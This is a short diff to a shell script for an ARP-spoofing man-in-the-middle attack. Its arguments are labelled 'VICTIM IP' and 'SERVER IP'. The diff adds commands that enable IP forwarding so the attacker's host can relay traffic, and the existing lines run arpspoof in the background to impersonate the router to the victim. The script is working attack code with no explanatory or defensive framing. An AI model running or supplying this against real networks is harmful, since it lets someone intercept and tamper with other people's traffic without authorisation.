@@ -2,6 +2,11 @@
 # $1 --> VICTIM IP
 # $2 --> SERVER IP
 
+echo "Enabling IP Forwarding (host will be able to be a router)"
+echo "sysctl -w new.ipv4.ip_forward=1"
+sudo sysctl -w net.ipv4.ip_forward=1
+echo ""
+
 echo "Spoofing victim ($1) to router ($2)"
 echo "sudo arpspoof -i wlp2s0 -t $1 $2"
 (sudo arpspoof -i wlp2s0 -t $1 $2 &) > /dev/null 2>&1
